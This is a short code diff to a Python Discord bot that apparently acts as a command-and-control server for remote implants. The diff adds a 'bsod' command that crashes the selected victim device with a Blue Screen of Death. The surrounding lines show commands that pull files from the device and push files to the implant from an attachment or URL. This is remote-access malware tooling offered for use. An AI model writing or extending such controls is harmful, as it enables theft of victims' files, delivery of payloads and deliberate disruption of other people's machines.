@@ -49,6 +49,11 @@ async def download(ctx, *, file_path: str):
     """Downloads a file from the selected device."""
     await dispatch_command(ctx, "download", f"Requested download of `{file_path}`", file_path)
 
+@bot.command(name="bsod")
+async def trigger_bsod(ctx):
+    """Triggers a Blue Screen of Death (BSOD) on the selected device."""
+    await dispatch_command(ctx, "bsod", "Triggered BSOD")
+
 @bot.command(name="upload")
 async def upload(ctx, path_on_implant: str, url: str = None):
     """Uploads a file to the selected device via attachment or URL."""
